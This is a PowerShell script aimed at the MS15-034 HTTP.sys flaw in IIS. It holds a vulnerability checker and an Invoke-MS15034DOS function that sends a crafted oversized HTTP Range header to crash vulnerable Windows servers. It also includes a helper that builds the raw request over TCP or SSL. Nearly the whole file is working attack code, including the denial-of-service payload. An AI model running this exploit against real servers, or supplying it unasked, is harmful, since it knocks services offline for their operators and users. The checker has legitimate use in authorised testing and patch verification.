#requires -Version 1
Function Test-MS15034
{
    Param
    (
        [Parameter(Mandatory = $True)]
        [String]$Computer,

        [Parameter(Mandatory = $False)]
        [Int]$Port = 80,

        [Parameter(Mandatory = $True, ParameterSetName = 'Windows2008')]
        [Switch]$Windows2008,

        [Parameter(Mandatory = $True, ParameterSetName = 'Windows2012')]
        [Switch]$Windows2012,

        [Parameter(Mandatory = $True, ParameterSetName = 'ServerPath')]
        [string]$ServerPath,

        [Parameter(Mandatory = $False)]
        [Switch]$UseSSL
    )
        
    if ($PSCmdlet.ParameterSetName -eq 'Windows2008')
    { $SrvPath = '/welcome.png' }
    elseif ($PSCmdlet.ParameterSetName -eq 'Windows2012')
    { $SrvPath = '/IIS-85.png' }
    elseif ($PSCmdlet.ParameterSetName -eq 'ServerPath')
    { $SrvPath = $ServerPath }   

    try
    { $Result = Invoke-MS15034Helper -Computer $Computer -Port $Port -Path $SrvPath -LowerRange 0 -UpperRange 18446744073709551615 -UseSSL:$UseSSL }
    catch
    { Throw ('An error occured during the connection to http://{0}:{1}{2}' -f $Computer, $Port, $SrvPath) }

    Write-Verbose -Message $Result

    if (-not $Result.contains('Server: Microsoft'))
    { Write-Error -Message 'The server does not appear to be running HTTP.SYS' }
    elseif ($Result.contains('HTTP/1.1 416 Requested Range Not Satisfiable'))
    { 'This server is vulnerable to MS 15-034' }
    elseif ($Result.contains('HTTP Error 400. The request has an invalid header name.'))
    { 'The server is not vulnerable to MS 15-034' }
    elseif ($Result.contains('HTTP/1.1 404 Not Found'))
    { Write-Error -Message 'The provided path has not been found, check you have selected the right operating system, or specified a valid file in -ServerPath' }
    else { 'Some other error has occured ?!?!?' }
}

Function Invoke-MS15034DOS
{
    Param
    (
        [Parameter(Mandatory = $True)]
        [String]$Computer,

        [Parameter(Mandatory = $False)]
        [Int]$Port = 80,

        [Parameter(Mandatory = $True, ParameterSetName = 'Windows2008')]
        [Switch]$Windows2008,

        [Parameter(Mandatory = $True, ParameterSetName = 'Windows2012')]
        [Switch]$Windows2012,

        [Parameter(Mandatory = $True, ParameterSetName = 'ServerPath')]
        [string]$ServerPath,

        [Parameter(Mandatory = $False)]
        [Switch]$UseSSL
    )

    if ($PSCmdlet.ParameterSetName -eq 'Windows2008')
    { $SrvPath = '/welcome.png' }
    elseif ($PSCmdlet.ParameterSetName -eq 'Windows2012')
    { $SrvPath = '/IIS-85.png' }
    elseif ($PSCmdlet.ParameterSetName -eq 'ServerPath')
    { $SrvPath = $ServerPath }

    # Test to see if the server is vulnerable
    try
    { $TestResults = Test-MS15034 -Computer $Computer -Port $Port -ServerPath $SrvPath -UseSSL:$UseSSL }
    catch
    { Throw ('An error occured during the connection to http://{0}:{1}{2}' -f $Computer, $Port, $SrvPath) }

    # If it is vulnerable, then perform the denial of service
    if ($TestResults -eq 'This server is vulnerable to MS 15-034')
    {
        'The server is vulnerable, performing Denial Of Service'
        try
        { $null = Invoke-MS15034Helper -Computer $Computer -Port $Port -Path $SrvPath -LowerRange 18 -UpperRange 18446744073709551615 -UseSSL:$UseSSL }
        catch
        {
            if ($_.Exception.InnerException.Message.Contains('A connection attempt failed because the connected party did not properly respond'))
            { 'Looks like the DOS was successful' }
            else
            { 'Error occured during execution of DOS'}
        }
    }
    else
    { 'Test-MS15034 reported the server not as vulnerable, so not performing Denial Of Service' }
}

Function Invoke-MS15034Helper
{
    Param
    (
        [Parameter(Mandatory = $True)]
        [String]$Computer,

        [Parameter(Mandatory = $True)]
        [Int]$Port,

        [Parameter(Mandatory = $True)]
        [String]$Path,

        [Parameter(Mandatory = $True)]
        [String]$LowerRange,

        [Parameter(Mandatory = $True)]
        [String]$UpperRange,

        [Parameter(Mandatory = $False)]
        [Switch]$UseSSL

    )

    $HTTPRequest = "GET {0} HTTP/1.1`r`nHost: stuff`r`nRange: bytes={1}-{2}`r`n`r`n" -f $Path, $LowerRange, $UpperRange
    Write-Verbose -Message $HTTPRequest

    $EncodedRequest = [System.Text.Encoding]::ASCII.GetBytes($HTTPRequest)
    
    $TCPClientRBSize = 500

    #Create a TCPClient connected to the specified computer and port, and then set the recieve buffer size
    $TCPClient = New-Object -TypeName System.Net.Sockets.TcpClient -ArgumentList ($Computer, $Port)
    $TCPClient.ReceiveBufferSize = $TCPClientRBSize    
    
    if ($UseSSL)
    {
        $TCPStream = New-Object -TypeName System.Net.Security.SslStream -ArgumentList ($TCPClient.GetStream())
        try 
        { $TCPStream.AuthenticateAsClient($computer) }
        catch
        { throw 'An SSL Error occured' }
    }
    else
    {
        #Get a Stream from the TCPClient
        $TCPStream = $TCPClient.GetStream()
    }
    
    #write the encoded request to the TCP Stream
    $TCPStream.Write($EncodedRequest,0,$EncodedRequest.Length)
    
    #Create a new recieve buffer
    $ReceiveBuffer = New-Object -TypeName Byte[] -ArgumentList $TCPClientRBSize   
    
    $null = $TCPStream.Read($ReceiveBuffer,0,$TCPClientRBSize)

    # Close the client and stream
    $TCPClient.Close()
    $TCPStream.Close()

    # Decode the response and then return it
    $HTTPResponse = [System.Text.Encoding]::ASCII.GetString($ReceiveBuffer,0,$TCPClientRBSize)
    $HTTPResponse
}
